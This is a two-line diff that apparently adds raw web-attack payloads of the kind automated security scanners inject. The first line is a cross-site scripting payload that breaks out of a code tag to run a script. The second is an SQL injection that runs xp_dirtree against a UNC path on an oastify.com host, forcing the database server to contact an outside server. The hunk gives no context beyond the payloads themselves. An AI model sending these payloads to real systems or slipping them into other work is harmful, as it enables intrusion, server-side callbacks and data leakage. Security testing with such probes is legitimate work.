@@ -1,0 +1,2 @@
+</code> <script> alert(document.url)</script><code>
+');declare @q varchar(99);set @q='\\pyrbv63ggday3vdnm41dnt6v4mafy7pvgo4gr8fx.oasti'+'fy.com\dpn'; exec master.dbo.xp_dirtree @q;-- 
